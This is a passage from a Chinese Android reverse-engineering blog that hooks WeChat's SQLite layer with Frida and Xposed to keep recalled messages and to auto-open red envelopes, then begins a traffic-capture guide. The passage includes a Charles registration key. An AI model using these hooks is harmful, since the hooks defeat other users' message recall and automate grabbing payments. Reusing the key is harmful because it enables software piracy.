<p>自己撤回消息提示的<code>msgType=10002</code>，别人撤回消息提示的<code>msgType=10000</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.wcdb.database.SQLiteDatabase&#x27;</span>);</span><br><span class="line">    clazz.updateWithOnConflict.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// printStack(&quot;updateWithOnConflict&quot;);</span></span><br><span class="line">        <span class="comment">// var log_str = &quot;arguments:&quot;</span></span><br><span class="line">        <span class="comment">// for (var i = 0; i &lt; arguments.length; i++) &#123;</span></span><br><span class="line">        <span class="comment">//     log_str += &quot; [&quot; + i + &quot;]&quot; + arguments[i]</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// console.log(&quot;updateWithOnConflict&quot;, log_str);</span></span><br><span class="line">        <span class="keyword">return</span> clazz.updateWithOnConflict.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><code>updateWithOnConflict()</code>方法将参数进行sql的拼接，然后使用<code>new SQLiteStatement()</code>创建<code>SQLiteStatement</code>对象，再用<code>executeUpdateDelete()</code>来执行</p>
<p>Frida hook一下<code>executeUpdateDelete()</code>方法</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.openClassFile(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).load();</span><br><span class="line">    <span class="keyword">const</span> gson = Java.use(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.wcdb.database.SQLiteStatement&#x27;</span>);</span><br><span class="line">    clazz.executeUpdateDelete.overload().implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// console.log(&quot;====================&quot;);</span></span><br><span class="line">        <span class="comment">// console.log(&quot;====================&quot;);</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;7.1.1.1 executeUpdateDelete&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;msql:&quot;</span>, <span class="built_in">this</span>.mSql.value, <span class="string">&quot;Args:&quot;</span>, <span class="built_in">this</span>.mBindArgs.value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz.executeUpdateDelete.overload().apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>当消息被撤回时，得到了以下输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7 f.a() arguments: [0]revokemsg [1][object Object] [2]AddMsgInfo(260954771), get[false], fault[false], up[false] fixTime[0]</span><br><span class="line">7.1 ca.a() arguments: [0]234 [1]com.tencent.mm.storage.bz@8b10ad0</span><br><span class="line">7.1.1 updateWithOnConflict arguments:</span><br><span class="line">7.1.1.1 executeUpdateDelete</span><br><span class="line">msql: UPDATE message SET msgId=?,type=?,content=? WHERE msgId=? Args: 234,10000,&quot;Forgo7ten.&quot; 撤回了一条消息,234</span><br><span class="line">7.1.1 updateWithOnConflict arguments:</span><br><span class="line">7.1.1.1 executeUpdateDelete</span><br><span class="line">msql: UPDATE rconversation SET msgType=?,flag=?,digestUser=?,digest=?,isSend=?,hasTrunc=?,unReadCount=?,conversationTime=?,content=?,username=?,status=? WHERE username=? Args: 10000,1629182140000,,&quot;Forgo7ten.&quot; 撤回了一条消息,0,1,0,1629182140000,&quot;Forgo7ten.&quot; 撤回了一条消息,wxid_00000000000000,3,wxid_00000000000000</span><br><span class="line">7.1.1 updateWithOnConflict arguments:</span><br><span class="line">7.1.1.1 executeUpdateDelete</span><br><span class="line">msql: UPDATE rconversation SET UnReadInvite=?,atCount=? WHERE username= ? Args: 0,0,wxid_00000000000000</span><br></pre></td></tr></table></figure>
<p>而我的目的主要是想 有撤回消息提示，同时不撤回消息</p>
<p>其中的参数<code>msgId</code>是本地的消息id，只有第一条数据库操作指令是<code>WHERE msgId=?</code>的</p>
<p>所以实际上将被撤回消息 替换成撤回提示的就是这一条。</p>
<h3 id="思路">思路<a class="header-anchor" href="#思路"> ¶ </a></h3>
<p>当然 已经找到数据库操作了。。剩下的就想怎么操作就怎么操作了</p>
<p>我想的是 将该条撤回提示直接<code>INSERT</code>进去，不知道<code>msgId</code>会不会重复，重复的话可以挨个调整？（不知道为啥无法使用<code>select count(*)</code>）</p>
<p>或者让提示在指定位置的就是让他被撤回，然后聊天内容添加到撤回提示后边。原聊天内容可以通过<code>select content from message where msgId = ?</code>查询，缺点是只能文字内容；弥补的话只能判断非文本内容不让他撤回了</p>
<p>是想用frida来写的，毕竟frida比较方便。但是构造不出方法参数<code>Object []</code>来。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java.array(&quot;Object&quot;,[]);</span><br><span class="line"></span><br><span class="line">var args = Java.use(&quot;java.util.ArrayList&quot;).$new();</span><br><span class="line">args.add(...);</span><br></pre></td></tr></table></figure>
<p>这两种都尝试了，但都会报错</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210817185555176.png" alt="image-20210817185555176"></p>
<p>mark一下，有知道的大佬麻烦分享一下呀。</p>
<h3 id="脚本实现-3">脚本实现<a class="header-anchor" href="#脚本实现-3"> ¶ </a></h3>
<p>这里只用xposed实现了，文本被撤回，但是有撤回提示；图片等等直接暴力不执行方法了…因为撤回提示无法解释图片啥的</p>
<p>效果图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210817235450332.png" alt="image-20210817235450332"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.forgo7ten.vxhook;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VxRevoke</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;com.tencent.mm&quot;</span>.equals(lpparam.packageName)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> String className = <span class="string">&quot;com.tencent.wcdb.database.SQLiteStatement&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> String methodName = <span class="string">&quot;executeUpdateDelete&quot;</span>;</span><br><span class="line">        Class&lt;?&gt; SDClazz = XposedHelpers.findClass(className, lpparam.classLoader);</span><br><span class="line">        XposedBridge.hookAllMethods(SDClazz, methodName, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="keyword">super</span>.beforeHookedMethod(param);</span><br><span class="line">                Log.d(<span class="string">&quot;VxHook&quot;</span>, <span class="string">&quot;executeUpdateDelete&quot;</span>);</span><br><span class="line">                Object mDatabase = XposedHelpers.getObjectField(param.thisObject, <span class="string">&quot;mDatabase&quot;</span>);</span><br><span class="line">                String mSql = (String) XposedHelpers.getObjectField(param.thisObject, <span class="string">&quot;mSql&quot;</span>);</span><br><span class="line">                Object[] mBindArgs = (Object[]) XposedHelpers.getObjectField(param.thisObject, <span class="string">&quot;mBindArgs&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;UPDATE message SET msgId=?,type=?,content=? WHERE msgId=?&quot;</span>.equals(mSql) &amp;&amp; ((String) mBindArgs[<span class="number">2</span>]).contains(<span class="string">&quot;撤回了一条消息&quot;</span>)) &#123;</span><br><span class="line">                    Object sm = XposedHelpers.newInstance(lpparam.classLoader.loadClass(<span class="string">&quot;com.tencent.wcdb.database.SQLiteStatement&quot;</span>),</span><br><span class="line">                            mDatabase,</span><br><span class="line">                            <span class="string">&quot;select content from message where msgId = ?&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> Object[]&#123;mBindArgs[<span class="number">3</span>]&#125;);</span><br><span class="line">                    String msg = (String) XposedHelpers.callMethod(sm, <span class="string">&quot;simpleQueryForString&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (!msg.contains(<span class="string">&quot;&lt;msg&gt;&quot;</span>)) &#123;</span><br><span class="line">                        mBindArgs[<span class="number">2</span>] = mBindArgs[<span class="number">2</span>] + <span class="string">&quot;:&quot;</span> + msg;</span><br><span class="line">                        Log.d(<span class="string">&quot;VxHook&quot;</span>, <span class="string">&quot;对方撤回了：&quot;</span> + msg);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        param.setResult(<span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其实也想将被撤回消息下面的每条消息都<code>msgId+1</code>然后将撤回消息<code>insert</code>进去。但是<code>select count(*)</code>不能使用，这块知识掌握也不太熟练，就没实现……</p>
<h2 id="vx自动抢红包">vx自动抢红包<a class="header-anchor" href="#vx自动抢红包"> ¶ </a></h2>
<h3 id="分析-4">分析<a class="header-anchor" href="#分析-4"> ¶ </a></h3>
<h4 id="红包消息监听">红包消息监听<a class="header-anchor" href="#红包消息监听"> ¶ </a></h4>
<p>自动抢红包肯定是先要监听到消息</p>
<p>之前已经分析到数据库，接收到消息肯定要插入或者更新数据库，于是hook了<code>com.tencent.wcdb.database.SQLiteDatabase.insertWithOnConflict</code>和<code>updateWithOnConflict</code>方法。观察接收消息时候的参数</p>
<p>当接收红包的时候，<code>insertWithOnConflict</code>被触发了4次，分别对<code>WalletLuckyMoney</code>,<code>LuckyMoneyDetailOpenRecord</code>,<code>message</code>,<code>AppMessage</code>数据库进行了插入</p>
<p>其中对<code>message</code>数据库操作参数字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;bizClientMsgId&quot;: &quot;&quot;,</span><br><span class="line">	&quot;talker&quot;: &quot;wxid_&quot;,</span><br><span class="line">	&quot;flag&quot;: 0,</span><br><span class="line">	&quot;bizChatId&quot;: -1,</span><br><span class="line">	&quot;msgId&quot;: 00,</span><br><span class="line">	&quot;type&quot;: 436207665,</span><br><span class="line">	&quot;content&quot;: &quot;&quot;,</span><br><span class="line">	&quot;msgSvrId&quot;: 7222869153754354100,</span><br><span class="line">	&quot;lvbuffer&quot;: [123, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 125],</span><br><span class="line">	&quot;createTime&quot;: 1629,</span><br><span class="line">	&quot;reserved&quot;: &quot;&quot;,</span><br><span class="line">	&quot;imgPath&quot;: &quot;&quot;,</span><br><span class="line">	&quot;talkerId&quot;: 33,</span><br><span class="line">	&quot;isSend&quot;: 0,</span><br><span class="line">	&quot;msgSeq&quot;: 723600000,</span><br><span class="line">	&quot;status&quot;: 3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而<code>updateWithOnConflict</code>则被触发了三次，都是对<code>rconversation</code>数据库进行的操作</p>
<p>同时发现，普通消息在插入的时候，插入到<code>message</code>数据库的<code>&quot;type&quot;:1</code>；图片<code>&quot;type&quot;:3</code>；语音<code>&quot;type:34&quot;</code>；撤回消息上面说过了，为<code>&quot;type&quot;:10000</code>(“你领取了xxx的红包”也是这种形式)；红包<code>&quot;type&quot;:436207665</code>；转账<code>&quot;type&quot;:419430449</code></p>
<p>同时发现了语音文件是藏在<code>/storage/emulated/0/Android/data/com.tencent.mm/MicroMsg/####/voice2/##/##/msg_###.amr</code>下，不知道为啥打不开</p>
<p>打开红包的时候，聊天界面也就是<code>message</code>数据库插入了一条消息<code>&quot;领取了xxx的红包&quot;</code>同时向<code>WalletLuckyMoney</code>数据库插入了两条消息</p>
<p>其中一条消息有<code>&quot;receiveTime&quot;: ,&quot;hbType&quot;:0,&quot;receiveAmount&quot;:1,&quot;receiveStatus&quot;:2,&quot;hbStatus&quot;:4,&quot;mNativeUrl&quot;:</code>等参数，而且如果点开了红包没有点击【开】按钮选择关闭的话，仍会插入上述参数，只是<code>&quot;receiveTime&quot;:0,&quot;hbType&quot;:0,&quot;receiveAmount&quot;:0,&quot;receiveStatus&quot;:0,&quot;hbStatus&quot;:2,&quot;mNativeUrl&quot;:</code></p>
<h4 id="红包流程分析">红包流程分析<a class="header-anchor" href="#红包流程分析"> ¶ </a></h4>
<p>还是先DDMS寻找按钮点击事件，发现在聊天页面点击红包消息触发的方法为<code>com.tencent.mm.ui.chatting.t$e.onClick()</code></p>
<p>最后在<code>onDone</code>方法里调用了<code>startActivity</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210818172734198.png" alt="image-20210818172734198"></p>
<p>堆栈信息为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.tencent.mm.br.d$9.onDone(Native Method)</span><br><span class="line">com.tencent.mm.br.d.a(SourceFile:909)</span><br><span class="line">com.tencent.mm.br.d.b(SourceFile:267)</span><br><span class="line">com.tencent.mm.br.d.a(SourceFile:148)</span><br><span class="line">com.tencent.mm.br.d.b(SourceFile:129)</span><br><span class="line">com.tencent.mm.ui.chatting.viewitems.g$b.c(SourceFile:728)</span><br><span class="line">com.tencent.mm.ui.chatting.viewitems.d$d.a(SourceFile:582)</span><br><span class="line">com.tencent.mm.ui.chatting.t$e.onClick(SourceFile:804)</span><br><span class="line">com.tencent.mm.ui.chatting.t$e.onClick(Native Method)</span><br><span class="line">android.view.View.performClick(View.java:6294)</span><br><span class="line">android.view.View$PerformClick.run(View.java:24770)</span><br><span class="line">android.os.Handler.handleCallback(Handler.java:790)</span><br><span class="line">android.os.Handler.dispatchMessage(Handler.java:99)</span><br><span class="line">android.os.Looper.loop(Looper.java:164)</span><br><span class="line">android.app.ActivityThread.main(ActivityThread.java:6494)</span><br><span class="line">java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:438)</span><br><span class="line">com.android.internal.os.ZygoteInit.main(ZygoteInit.java:807)</span><br></pre></td></tr></table></figure>
<p>其中<code>com.tencent.mm.ui.chatting.viewitems.g$b.c</code>中的判断，这个url是收到红包时插入<code>WalletLuckyMoney</code>数据库中的那条</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210818221446826.png" alt="image-20210818221446826"></p>
<p>在<code>com.tencent.mm.br.d.b(android.content.Context, java.lang.String, java.lang.String, android.content.Intent) : void</code>截取一下<code>intent</code>的参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;key_msgid&quot;: 0, </span><br><span class="line">    &quot;key_material_flag&quot;: 0, </span><br><span class="line">    &quot;key_has_story&quot;: false, </span><br><span class="line">    &quot;key_way&quot;: 1, </span><br><span class="line">    &quot;scene_id&quot;: 0, </span><br><span class="line">    &quot;key_cropname&quot;: &quot;&quot;, </span><br><span class="line">    &quot;key_native_url&quot;: &quot;wxpay://c2cbizmessagehandler/hongbao/receivehongbao?msgtype&quot;, </span><br><span class="line">    &quot;key_emoji_md5&quot;: &quot;&quot;, </span><br><span class="line">    &quot;key_receive_envelope_md5&quot;: &quot;&quot;, </span><br><span class="line">    &quot;key_receive_envelope_url&quot;: &quot;&quot;, </span><br><span class="line">    &quot;key_detail_envelope_md5&quot;: &quot;&quot;, </span><br><span class="line">    &quot;key_detail_envelope_url&quot;: &quot;&quot;, </span><br><span class="line">    &quot;key_username&quot;: &quot;wxid_00000000000000&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而红包界面的【开】按钮是在<code>LuckyMoneyNotHookReceiveUI$10.onClick()</code>这里触发的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210818214917150.png" alt="image-20210818214917150"></p>
<p>然后进入了<code>auQ()</code>方法</p>
<p>监听红包消息，然后让软件执行这些流程。我分析了一些，没有找到最直接的控制红包入账的方法（😂分析躁了，开学补考得开始复习了）</p>
<h3 id="思路-2">思路<a class="header-anchor" href="#思路-2"> ¶ </a></h3>
<p>这里参考了<a href="https://github.com/skyun1314/WeChat-plug-in">skyun1314/WeChat-plug-in (github.com)</a></p>
<p>监听<code>insertWithOnConflict</code>方法，当接收到红包消息的时候，先使用<code>com.tencent.mm.br.d.b(android.content.Context, java.lang.String, java.lang.String, android.content.Intent) : void</code>这个静态方法初始化<code>LuckyMoneyNotHookReceiveUI</code>，然后监听<code>onCreate()</code>方法，来执行<code>this.wrX</code>按钮的点击事件。</p>
<h3 id="脚本实现-4">脚本实现<a class="header-anchor" href="#脚本实现-4"> ¶ </a></h3>
<p>这样实现的缺点是会弹窗……，如果想实现不弹窗，估计要继续追着【开】按钮<code>onClick</code>方法进去找最主要的那个方法了😲😪</p>
<h4 id="效果图">效果图<a class="header-anchor" href="#效果图"> ¶ </a></h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//auto_luckymoney.gif" alt="auto_luckymoney"></p>
<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">收到红包</span><br><span class="line">find instance :com.tencent.mm.ui.chatting.e.a@df7c891</span><br><span class="line">content = com.tencent.mm.ui.LauncherUI@f03a980</span><br><span class="line">click result: true</span><br><span class="line">click result: true</span><br><span class="line">click result: true</span><br></pre></td></tr></table></figure>
<h4 id="代码实现">代码实现<a class="header-anchor" href="#代码实现"> ¶ </a></h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        Java.openClassFile(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).load();</span><br><span class="line">        <span class="keyword">const</span> gson = Java.use(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.wcdb.database.SQLiteDatabase&#x27;</span>);</span><br><span class="line">        clazz.insertWithOnConflict.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">// console.log(&quot;insertWithOnConflict&quot;);</span></span><br><span class="line">            <span class="comment">// console.log(&quot;[0]&quot;+arguments[0],&quot;[1]&quot;+arguments[1],&quot;[2]&quot;+gson.$new().toJson(arguments[2]));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">arguments</span>[<span class="number">0</span>] == <span class="string">&quot;message&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> values = Java.cast(<span class="built_in">arguments</span>[<span class="number">2</span>], Java.use(<span class="string">&quot;android.content.ContentValues&quot;</span>));</span><br><span class="line">                <span class="keyword">var</span> msg_type = values.get(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (msg_type == <span class="string">&quot;436207665&quot;</span>) &#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&quot;收到红包&quot;</span>);</span><br><span class="line">                    <span class="keyword">var</span> content;</span><br><span class="line">                    Java.choose(<span class="string">&quot;com.tencent.mm.ui.chatting.e.a&quot;</span>, &#123;</span><br><span class="line">                        <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">                            <span class="built_in">console</span>.log(<span class="string">&quot;find instance :&quot;</span> + x);</span><br><span class="line">                            content = x.LDE.value.getContext();</span><br><span class="line">                            <span class="built_in">console</span>.log(<span class="string">&quot;content =&quot;</span>, content);</span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                    open_luck_money(content, values);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// var intent = Java.cast(arguments[2],Java.use(&quot;android.content.Intent&quot;));</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (msg_type == <span class="string">&quot;419430449&quot;</span>) &#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&quot;收到转账&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz.insertWithOnConflict.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open_luck_money</span>(<span class="params">content, values</span>) </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">xml_get_value</span>(<span class="params">content, start, end</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> javaString = Java.use(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> str_start = javaString.$new(start);</span><br><span class="line">            <span class="keyword">var</span> str_end = javaString.$new(end);</span><br><span class="line">            <span class="keyword">var</span> str_content = javaString.$new(content);</span><br><span class="line">            <span class="keyword">var</span> start_index = str_content.indexOf(str_start);</span><br><span class="line">            <span class="keyword">var</span> end_index = str_content.indexOf(str_end);</span><br><span class="line">            <span class="keyword">var</span> result = str_content.substring(start_index+str_start.length(),end_index);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> javaString = Java.use(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> intent = Java.use(<span class="string">&quot;android.content.Intent&quot;</span>).$new();</span><br><span class="line">        <span class="keyword">var</span> v_content = values.get(<span class="string">&quot;content&quot;</span>);</span><br><span class="line">        intent.putExtra(javaString.$new(<span class="string">&quot;key_msgid&quot;</span>), Java.use(<span class="string">&quot;java.lang.Long&quot;</span>).parseLong(<span class="string">&quot;&quot;</span>+values.get(<span class="string">&quot;msgId&quot;</span>)));</span><br><span class="line">        intent.putExtra(javaString.$new(<span class="string">&quot;key_way&quot;</span>), Java.use(<span class="string">&quot;java.lang.Integer&quot;</span>).parseInt(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">        intent.putExtra(javaString.$new(<span class="string">&quot;key_has_story&quot;</span>), Java.use(<span class="string">&quot;java.lang.Boolean&quot;</span>).FALSE.value);</span><br><span class="line">        intent.putExtra(javaString.$new(<span class="string">&quot;key_username&quot;</span>), javaString.$new(values.get(<span class="string">&quot;talker&quot;</span>)));</span><br><span class="line">        intent.putExtra(javaString.$new(<span class="string">&quot;key_native_url&quot;</span>), javaString.$new(xml_get_value(v_content,<span class="string">&quot;&lt;nativeurl&gt;&lt;![CDATA[&quot;</span>,<span class="string">&quot;]]&gt;&lt;/nativeurl&gt;&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> luckymoney_str = javaString.$new(<span class="string">&quot;luckymoney&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> luckymoneyUI_str = javaString.$new(<span class="string">&quot;.ui.LuckyMoneyNotHookReceiveUI&quot;</span>);</span><br><span class="line">        Java.use(<span class="string">&#x27;com.tencent.mm.br.d&#x27;</span>).b(content, luckymoney_str, luckymoneyUI_str,intent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.mm.plugin.luckymoney.ui.LuckyMoneyNotHookReceiveUI&#x27;</span>);</span><br><span class="line">        clazz.onSceneEnd.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = clazz.onSceneEnd.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;click result:&quot;</span>,<span class="built_in">this</span>.wrX.value.performClick());</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure>
<h2 id="参考文章">参考文章<a class="header-anchor" href="#参考文章"> ¶ </a></h2>
<p><a href="https://www.toutiao.com/i6480401747104760333/">微信Log日志分析——初步探索 (toutiao.com)</a></p>
<p><a href="https://www.52pojie.cn/thread-1097114-1-1.html">简单分析骰子流程 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><a href="https://www.52pojie.cn/thread-1097737-1-1.html">某聊天软件撤回流程的分析与防撤回实现 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p>[<a href="https://bbs.pediy.com/thread-226260.htm">原创]Xposed第二课(微信篇) 聊天界面修改文字-Android安全-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>
<p>[<a href="https://bbs.pediy.com/thread-226674.htm">原创]Xposed第三课(微信篇) 防止好友消息撤回-Android安全-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>
<p>[<a href="https://bbs.pediy.com/thread-225878.htm">下载]微信6.6.1 Xposed模块 包含 主动发消息 防撤回 抢红包 骰子作弊 模拟位置 步数最高-Android安全-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>
<p>深表谢意</p>
<h2 id="最后">最后<a class="header-anchor" href="#最后"> ¶ </a></h2>
<p>应付完考试继续研究……</p>
]]></content>
      <categories>
        <category>Android逆向</category>
        <category>小展身手</category>
      </categories>
      <tags>
        <tag>Android逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Android抓包配置合集</title>
    <url>/AndroidReverse/2021/Android_traffic_capture_configuration_collection/</url>
    <content><![CDATA[<h1 id="Android抓包ALL-IN-ONE">Android抓包ALL IN ONE<a class="header-anchor" href="#Android抓包ALL-IN-ONE"> ¶ </a></h1>
<h2 id="抓包软件配置">抓包软件配置<a class="header-anchor" href="#抓包软件配置"> ¶ </a></h2>
<h3 id="Charles">Charles<a class="header-anchor" href="#Charles"> ¶ </a></h3>
<h4 id="初始配置">初始配置<a class="header-anchor" href="#初始配置"> ¶ </a></h4>
<blockquote>
<p>Charles注册码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;Name: Forgo7ten.github.io</span><br><span class="line">&gt;Key: 6868255341EDC5CD3D</span><br></pre></td></tr></table></figure>
</blockquote>
<ol>
<li>
<p>安装证书</p>
<ol>
<li>菜单栏<code>Help</code>-&gt;<code>SSL Proxying</code>-&gt;<code>Install Charles Root Certificate</code>，保存到<code>受信任的根证书颁发机构</code></li>
<li><code>Save Charles Root Certificate</code>，保存证书，配置到手机</li>
</ol>
</li>
<li>
<p>配置访问控制设置</p>
<ol>
<li>菜单栏<code>Proxy</code>-&gt;<code>Access Control settings...</code></li>
<li>【Add】 <code>0.0.0.0/0</code></li>
<li>点击【OK】</li>
</ol>
</li>
<li>
<p>配置代理服务器设置</p>
<ol>
<li>
<p>菜单栏<code>Proxy</code>-&gt;<code>proxying settings...</code></p>
